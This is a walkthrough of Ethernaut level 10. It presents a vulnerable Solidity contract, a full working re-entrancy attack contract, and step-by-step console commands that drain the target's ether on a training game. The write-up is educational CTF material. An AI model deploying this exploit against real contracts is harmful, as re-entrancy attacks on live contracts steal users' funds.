# Level 10: Re-entrancy

This is the level 10 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- Solidity contract [receive](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995) function
- [call](https://docs.soliditylang.org/en/v0.6.0/types.html#address) method of addresses
- [Re-entrancy Attack](https://consensys.github.io/smart-contract-best-practices/known_attacks/) on Ethereum

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

`player` has to steal all of the contract's funds.

To those interested, the Re-entrancy attack was responsible for the [infamous DAO hack of 2016](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao#section-what-is-a-dao) which shook the whole Ethereum community. $60 million dollars of funds were stolen. Later, Ethereum blockchain was hard forked to restore stolen funds, but not all parties consented to decision. That led to splitting of network into distinct chains - Ethereum and Ethereum Classic.

First let's see amount stored in `Reentrace`:
```javascript
await getBalance(contract.address)

// Output: '0.001'
```

which is `0.001` ether or `1000000000000000` wei.

We're going to attack `Reentrance` with our written contract `ReentranceAttack`. Deploy it with target contract (`Reentrance`) address:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    address public owner;
    IReentrance targetContract;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate.value(msg.value)(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(targetValue);
        }
    }
}
```

Now call `donateAndWithdraw` of `ReentranceAttack` with value of `1000000000000000` (`0.001` ether) and chain reaction starts:
- First `targetContract.donate.value(msg.value)(address(this))` causes the `balances[msg.sender]` of `Reentrance` to set to sent amount. `donate` of `Reentrance` finishes it's execution
- Immediately after, `targetContract.withdraw(msg.value)` invokes withdraw of `Reentrance`, which sends the same donated amount back to `ReentranceAttack`.
- `receive` of `ReentranceAttack` is invoked. Note that `withdraw` hasn't finished execution yet! So still `balances[msg.sender]` is equal to initially donated amount. Now we call `withdraw` of `ReentranceAttack` again in receive.
- Second invocation of `withdraw` executes and it's passes the `require` statement this time again! So, it sends the `msg.sender` (`ReentranceAttack` address) that amount again!
- Simple arithmetic plays out and recursive execution is halted only when balance of `Reentrance` is reduced to 0.

And for the final blow withdraw stolen amount currently stored in `ReentranceAttack` to `player` address by calling `withdrawAll`.

Verify by checking `Reentrance`'s balance:
```javascript
await getBalance(contract.address)

// Output: '0'
```

Hacked!

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/the_nvn)_ 🙏

